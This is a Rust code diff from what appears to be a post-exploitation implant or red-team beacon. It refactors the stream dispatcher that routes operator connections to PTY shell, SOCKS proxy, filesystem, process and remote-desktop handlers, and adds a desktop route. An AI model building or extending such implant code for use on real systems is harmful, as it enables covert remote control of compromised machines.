@@ -128,8 +128,13 @@ impl Transport for TcpTransport {
                                             }
                                             
                                             crate::utils::db_print(&format!("[Yamux] Stream {} Type: 0x{:02X}", stream_id, type_buf[0]));
+                                            use crate::transport::stream_types::{
+                                                YAMUX_STREAM_DESKTOP, YAMUX_STREAM_FS,
+                                                YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY,
+                                                YAMUX_STREAM_SOCKS,
+                                            };
                                             match type_buf[0] {
-                                                0x01 => {
+                                                YAMUX_STREAM_PTY => {
                                                     #[cfg(feature = "pty")]
                                                     {
                                                         crate::utils::db_print(&format!("[Yamux] Routing to PTY handler (Stream {})", stream_id));
@@ -146,7 +151,7 @@ impl Transport for TcpTransport {
                                                         let _ = s.close().await;
                                                     }
                                                 }
-                                                0x02 => {
+                                                YAMUX_STREAM_SOCKS => {
                                                     #[cfg(feature = "socks")]
                                                     {
                                                         crate::socks::handle_stream(stream).await;
@@ -156,7 +161,7 @@ impl Transport for TcpTransport {
                                                         let _ = stream;
                                                     }
                                                 }
-                                                0x03 => {
+                                                YAMUX_STREAM_FS => {
                                                     #[cfg(feature = "post-ex")]
                                                     { crate::fs::handle_stream(stream).await; }
                                                     #[cfg(not(feature = "post-ex"))]
@@ -167,7 +172,7 @@ impl Transport for TcpTransport {
                                                         let _ = s.close().await;
                                                     }
                                                 }
-                                                0x04 => {
+                                                YAMUX_STREAM_PROCESS => {
                                                     #[cfg(feature = "post-ex")]
                                                     { crate::process::handle_stream(stream).await; }
                                                     #[cfg(not(feature = "post-ex"))]
@@ -176,6 +181,17 @@ impl Transport for TcpTransport {
                                                         let mut s = stream;
                                                         let _ = s.write_all(b"\r\n[!] process module not in Stage0 (beacon)\r\n").await;
                                                         let _ = s.close().await;
+                                                    }
+                                                }
+                                                YAMUX_STREAM_DESKTOP => {
+                                                    // Product: thin bridge → L2 mod_desktop if loaded.
+                                                    #[cfg(feature = "module-loader")]
+                                                    {
+                                                        crate::transport::desktop_bridge::handle_stream(stream).await;
+                                                    }
+                                                    #[cfg(not(feature = "module-loader"))]
+                                                    {
+                                                        crate::transport::desktop_reject::reject_desktop_stream(stream).await;
                                                     }
                                                 }
                                                 _ => { crate::utils::db_print(&format!("[Yamux] Unknown type: 0x{:02X}", type_buf[0])); }
